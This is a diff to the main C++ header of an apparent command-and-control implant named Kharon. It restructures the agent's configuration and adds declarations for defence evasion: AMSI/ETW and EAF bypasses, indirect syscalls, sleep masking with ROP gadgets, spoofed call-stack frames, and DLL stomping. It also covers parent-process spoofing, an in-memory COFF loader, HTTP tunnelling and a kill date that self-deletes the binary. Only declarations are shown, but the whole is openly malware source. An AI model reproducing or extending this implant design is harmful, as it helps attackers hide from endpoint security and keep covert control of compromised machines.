@@ -56,6 +56,7 @@ class Pivot;
 class Coff;
 class Beacon;
 class Spoof;
+class Proxy;
 class Syscall;
 class Jobs;
 class Useful;
@@ -73,16 +74,65 @@ class Token;
 class Socket;
 
 typedef struct {
+
+    //
+    // Identity
+    //
+
     CHAR* AgentId;
+    ULONG Profile;
+
+    //
+    // Timing
+    //
+
     ULONG SleepTime;
     ULONG Jitter;
-    BYTE  EncryptKey[16];
-    ULONG BofProxy;
-    BOOL  Syscall;
-    ULONG AmsiEtwBypass;
-    ULONG ChunkSize;
 
-    ULONG Profile;
+    //
+    // Crypto
+    //
+
+    BYTE EncryptKey[16];
+
+    //
+    // Evasion
+    //
+
+    struct {
+        BOOL  Syscall;
+        ULONG AmsiEtwBypass;
+        ULONG BofProxy;
+        BOOL  EafBypass;
+        UPTR  EafGadget;
+    } Evasion;
+
+    //
+    // Sleep Masking
+    //
+
+    struct {
+        UINT8 Beacon;
+        UINT8 Logic;
+        BOOL  Heap;
+        UPTR  NtContinueGadget;
+        UINT8 JmpRegGadget; // [rbx] | rax | rdi
+        UPTR  JmpGadget;
+    } Mask;
+
+    //
+    // Stack Spoofing
+    //
+
+    struct {
+        ULONG FrameCount;
+
+        FRAME_INFO Frames[8];
+    } Spoof;
+
+    //
+    // Process Creation
+    //
 
     struct {
         ULONG  ParentID;
@@ -90,53 +140,57 @@ typedef struct {
         BOOL   BlockDlls;
         WCHAR* CurrentDir;
         WCHAR* SpoofArg;
-    } Ps;
+    } Process;
+
+    //
+    // Post-Exploitation
+    //
 
     struct {
         WCHAR* Spawnto;
         CHAR*  ForkPipe;
-        PCHAR  CurrentUUID;
+        PCHAR  CurrentId;
     } Postex;
+
+    //
+    // Guardrails
+    //
 
     struct {
         CHAR* UserName;
         CHAR* DomainName;
         CHAR* IpAddress;
         CHAR* HostName;
-    } Guardrails = {
-        .UserName   = nullptr,
-        .DomainName = nullptr,
-        .IpAddress  = nullptr,
-        .HostName   = nullptr
-    };
+    } Guardrails;
+
+    //
+    // Working Time
+    //
 
     struct {
-        UINT8 Beacon;
-        BOOL  Heap;
-
-        UPTR NtContinueGadget;
-        UPTR JmpGadget;
-    } Mask;
-
-    struct {
-        BOOL Enabled;
-
+        BOOL  Enabled;
         INT16 StartHour;
         INT16 StartMin;
-
         INT16 EndHour;
         INT16 EndMin;
     } Worktime;
 
-    struct {
-        BOOL Enabled;
-        BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
-        BOOL ExitProc;   // if true, exit the process, else exit the thread
+    //
+    // Kill Date
+    //
 
+    struct {
+        BOOL  Enabled;
+        BOOL  SelfDelete;   // self-delete the process binary from disk
+        BOOL  ExitProc;     // true = exit process, false = exit thread
         INT16 Day;
         INT16 Month;
         INT16 Year;
     } KillDate;
+
+    //
+    // HTTP Transport
+    //
 
     struct {
         PROXY_SETTINGS   Proxy;
@@ -145,6 +199,13 @@ typedef struct {
         ULONG            CallbacksCount;
         HTTP_CALLBACKS** Callbacks;
     } Http;
+
+    //
+    // Transport Chunk Size
+    //
+
+    ULONG ChunkSize;
+
 } KHARON_CONFIG;
 
 auto DECLFN GetConfig( _Out_ KHARON_CONFIG* Cfg ) -> VOID;
@@ -177,7 +238,7 @@ struct _JOBS {
     PARSER*  Psr;
     ULONG    State;
     ULONG    ExitCode;
-    PCHAR    UUID;
+    PCHAR    Id;
     ULONG    CmdID;
     BOOL     Clean;
     BOOL     PersistTriggered;
@@ -194,6 +255,7 @@ namespace Root {
         Beacon*    Bc;
         Coff*      Cf;
         Spoof*     Spf;
+        Proxy*     Prx;
         Syscall*   Sys;
         Socket*    Skt;
         Jobs*      Jbs;
@@ -265,6 +327,9 @@ namespace Root {
             PCHAR ImagePath;
             BOOL  Elevated;
             BOOL  Connected;
+            ULONG MemoryType;
+
+            STOMP_DLL_INFO Stomp;
 
             struct {
                 UPTR Start;
@@ -369,6 +434,8 @@ namespace Root {
             DECLAPI( FreeLibrary );
             DECLAPI( LoadLibraryA ); 
             DECLAPI( LoadLibraryW );
+            DECLAPI( LoadLibraryExA );
+            DECLAPI( LoadLibraryExW );
             DECLAPI( GetProcAddress );
             DECLAPI( GetModuleHandleA );
             DECLAPI( GetModuleHandleW );
@@ -407,6 +474,7 @@ namespace Root {
             DECLAPI( DisconnectNamedPipe );
             DECLAPI( FlushFileBuffers );
             DECLAPI( GetCurrentDirectoryA );
+            DECLAPI( GetSystemDirectoryW );
             DECLAPI( PeekNamedPipe );
             DECLAPI( ConnectNamedPipe );
             DECLAPI( WaitNamedPipeA );
@@ -496,6 +564,8 @@ namespace Root {
             RSL_TYPE( FreeLibrary ),
             RSL_TYPE( LoadLibraryA ),
             RSL_TYPE( LoadLibraryW ),
+            RSL_TYPE( LoadLibraryExA ),
+            RSL_TYPE( LoadLibraryExW ),
             RSL_TYPE( GetProcAddress ),
             RSL_TYPE( GetModuleHandleA ),
             RSL_TYPE( GetModuleHandleW ),
@@ -532,6 +602,7 @@ namespace Root {
             RSL_TYPE( CreateFileTransactedA ),
             RSL_TYPE( CreatePipe ),
             RSL_TYPE( GetCurrentDirectoryA ),
+            RSL_TYPE( GetSystemDirectoryW ),
             RSL_TYPE( PeekNamedPipe ),
             RSL_TYPE( ConnectNamedPipe ),
             RSL_TYPE( WaitNamedPipeA ),
@@ -623,7 +694,6 @@ namespace Root {
             DECLAPI( DbgPrint );
             DECLAPI( NtClose );
             DECLAPI( RtlRandomEx );
-
     
             DECLAPI( NtAllocateVirtualMemory );
             DECLAPI( NtWriteVirtualMemory );
@@ -632,8 +702,10 @@ namespace Root {
             DECLAPI( NtReadVirtualMemory );
             DECLAPI( NtCreateSection );
             DECLAPI( NtMapViewOfSection );
+            DECLAPI( NtUnmapViewOfSection );
 
-            DECLAPI( khRtlFillMemory );
+            DECLAPI( _RtlFillMemory );
+            DECLAPI( _RtlCopyMemory );
 
             DECLAPI( LdrGetProcedureAddress );
 
@@ -708,8 +780,10 @@ namespace Root {
             RSL_TYPE( NtReadVirtualMemory ),
             RSL_TYPE( NtCreateSection ),
             RSL_TYPE( NtMapViewOfSection ),
+            RSL_TYPE( NtUnmapViewOfSection ),
 
-            RSL_TYPE( khRtlFillMemory ),
+            RSL_TYPE( _RtlFillMemory ),
+            RSL_TYPE( _RtlCopyMemory ),
 
             RSL_TYPE( LdrGetProcedureAddress ),
     
@@ -966,32 +1040,22 @@ public:
     Spoof( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
     struct {
-        FRAME_INFO First;   // 0x00  // RtlUserThreadStart+0x21
-        FRAME_INFO Second;  // 0x10  // BaseThreadInitThunk+0x14
-        FRAME_INFO Gadget;  // 0x20  // rbp gadget
-        
-        UPTR Restore;      // 0x30
-        UPTR Ssn;          // 0x38
-        UPTR Ret;          // 0x40
-        
-        UPTR Rbx;          // 0x48
-        UPTR Rdi;          // 0x50
-        UPTR Rsi;          // 0x58
-        UPTR R12;          // 0x60
-        UPTR R13;          // 0x68
-        UPTR R14;          // 0x70
-        UPTR R15;          // 0x78
-
-        UPTR ArgCount;     // 0x80
-        UPTR OriginalRsp;  // 0x88  
-    } Setup = {
-        .First { 
-            .Ptr = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x21
-        },
-        .Second {
-            .Ptr = (UPTR)this->Self->Krnl32.BaseThreadInitThunk + 0x14,
-        },
-    };
+        ULONG      FramesCount;    // 0x00  (padded to 8)
+        FRAME_INFO Frames[8];      // 0x08  (8 * 16 = 0x80 bytes, ends at 0x88)
+        FRAME_INFO Gadget;         // 0x88
+        UPTR       Restore;        // 0x98
+        UPTR       Ssn;            // 0xA0
+        UPTR       Ret;            // 0xA8
+        UPTR       Rbx;            // 0xB0
+        UPTR       Rdi;            // 0xB8
+        UPTR       Rsi;            // 0xC0
+        UPTR       R12;            // 0xC8
+        UPTR       R13;            // 0xD0
+        UPTR       R14;            // 0xD8
+        UPTR       R15;            // 0xE0
+        UPTR       ArgCount;       // 0xE8
+        UPTR       OriginalRsp;    // 0xF0
+    } Setup = {};
 
     auto Call( 
         _In_ UPTR Fnc, _In_ UPTR Ssn,
@@ -1002,7 +1066,17 @@ public:
     ) -> UPTR;
 
     auto StackSizeWrapper( _In_ UPTR RetAddress ) -> UPTR;
-    auto StackSize( _In_ UPTR RtmFunction, _In_ UPTR ImgBase ) -> UPTR;
+    auto StackSizeInternal( _In_ UPTR RtmFunction, _In_ UPTR ImgBase, _In_ UPTR RetAddress ) -> UPTR;
+    auto StackSize( _In_ UPTR RtmFunction, _In_ UPTR ImgBase, _In_ UPTR RetAddress ) -> UPTR;
+};
+
+class Proxy {
+private:
+    Root::Kharon* Self;
+public:
+    Proxy( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    auto Call( UPTR FuncPtr, UPTR Arg1, UPTR Arg2, UPTR Arg3, UPTR Arg4, UPTR Arg5, UPTR Arg6, UPTR Arg7, UPTR Arg8, UPTR Arg9 );
 };
 
 class Coff {
@@ -1109,15 +1183,15 @@ public:
     auto RslApi( _In_ PCHAR SymName ) -> PVOID;
 
     auto Loader( 
-        _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, _In_ ULONG Argc
+        _In_ BOOL Async, _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, _In_ ULONG Argc
     ) -> BOOL;
 
     auto Execute(
-        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, _In_ ULONG Argc
+        _In_ BOOL Async, _In_ COFF_MAPPED* Mapped, _In_ COFF_SHARED* Shared, _In_ BYTE* Args, _In_ ULONG Argc
     ) -> BOOL;
 
     auto FindSymbol( _In_ COFF_MAPPED* Mapped, _In_ PCHAR SymName ) -> PVOID;
-    auto Map( _In_  BYTE* Buffer, _In_ ULONG Size, _Out_ COFF_MAPPED* Mapped ) -> BOOL;
+    auto Map( _In_ BOOL Async, _In_ BYTE* Buffer, _In_ ULONG Size, _Out_ COFF_MAPPED* Mapped ) -> BOOL;
     auto Unmap( _In_ COFF_MAPPED* Mapped ) -> BOOL;
     auto Obfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
     auto Deobfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
@@ -1246,7 +1320,7 @@ public:
     CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
     CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
 
-    CHAR* CurrentUUID  = nullptr;
+    CHAR* CurrentId    = nullptr;
     ULONG CurrentCmdId = 0;
     ULONG CurrentSubId = 0;
     
@@ -1257,8 +1331,8 @@ public:
     auto Create( _In_ CHAR* UUID, _In_ PARSER* Parser, _In_ BOOL IsResponse = FALSE ) -> JOBS*;
 
     auto GetAll( VOID ) -> VOID;
-    auto GetByID( _In_ ULONG ID ) -> JOBS*;
-    auto GetByUUID( _In_ CHAR* UUID ) -> JOBS*;
+    auto GetByCmdId( _In_ ULONG Id ) -> JOBS*;
+    auto GetById( _In_ CHAR* Id ) -> JOBS*;
     auto Remove( _In_ JOBS* Job ) -> BOOL;
 
     auto Cleanup( VOID ) -> VOID;
@@ -1269,6 +1343,8 @@ private:
     Root::Kharon* Self;
 public:
     Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    auto ModulePath( _In_ UPTR LibHash ) -> UPTR;
 
     auto CfgAddrAdd( _In_ PVOID ImageBase, _In_ PVOID Function ) -> VOID;
     auto CfgPrivAdd( _In_ HANDLE hProcess, _In_ PVOID  Address, _In_ DWORD  Size ) -> VOID;
@@ -1351,6 +1427,19 @@ public:
     auto Wstr( _In_ PPARSER parser, _In_ ULONG* size ) -> PWCHAR;
 };
 
+struct _TRANSPORT_CHUNK_NODE {
+    struct {
+        PVOID Buffer;
+        ULONG Size;
+    } Remaining;
+
+    PCHAR TaskId;
+    BYTE  Index;
+
+    struct _TRANSPORT_CHUNK_NODE* Next;
+};
+typedef _TRANSPORT_CHUNK_NODE TRANSPORT_CHUNK_NODE;
+
 class Transport {    
 private:
     Root::Kharon* Self;
@@ -1388,7 +1477,14 @@ public:
         ULONG  StartTick;
         ULONG  WaitTime;
         ULONG  CloseTimer;
-    } Tunnels[30];
+    } Tunnels[60];
+
+    TRANSPORT_CHUNK_NODE* SendNode;
+    TRANSPORT_CHUNK_NODE* RecvNode;
+
+    HTTP_REQUEST_CONFIG  RequestConfig;
+
+    PPENDING_CHUNK PendingChunks;
 
     ULONG DownloadTasksCount = 0;
     ULONG TunnelTasksCount   = 0;
@@ -1400,6 +1496,31 @@ public:
     auto StrategyRot( VOID ) -> HTTP_CALLBACKS*;
 
     auto CleanupHttpContext( HTTP_CONTEXT* Ctx ) -> BOOL;
+
+   auto ResolveRequest() -> BOOL;
+
+    auto FreePendingNode(
+        _In_ PPENDING_CHUNK Node
+    ) -> VOID;
+
+    auto DequeuePending(
+    ) -> PPENDING_CHUNK;
+
+    auto EnqueuePending(
+        _In_ PBYTE Data,
+        _In_ ULONG Size,
+        _In_ PCHAR TaskId,
+        _In_ PCHAR AgentId,
+        _In_ UCHAR ActTask,
+        _In_ PBYTE Header,
+        _In_ ULONG HeaderSize,
+        _In_ BOOL  IsLast
+    ) -> VOID;
+
+    auto GetTotalRequestSize(     
+        _In_ MM_INFO*       SendData,
+        _In_ OUTPUT_FORMAT* ClientOut 
+    ) -> ULONG;
 
     auto PrepareUrl(
         _In_ HTTP_CONTEXT*   Ctx,
@@ -1695,6 +1816,10 @@ public:
         _Inout_ SIZE_T* ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG PageProtection
     ) -> LONG;
 
+    auto UnmapView(
+        HANDLE ProcessHandle, PVOID BaseAddress
+    ) -> LONG;
+
     auto CreateSection( 
         _Out_ HANDLE* SectionHandle, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ LARGE_INTEGER* MaximumSize, 
         _In_ ULONG SectionPageProtection, _In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle
@@ -1711,6 +1836,10 @@ public:
     auto Main(  _In_ ULONG Time ) -> BOOL;
     auto Timer( _In_ ULONG Time ) -> BOOL;
     auto Wait(  _In_ ULONG Time ) -> BOOL;
+
+    auto ChainDefault( _Inout_ CHAIN_DATA* Chain ) -> VOID;
+    auto ChainStomp1( _Inout_ CHAIN_DATA* Chain ) -> VOID;
+    auto ChainStomp2( _Inout_ CHAIN_DATA* Chain ) -> VOID;
 };
 
 #endif // KHARON_H
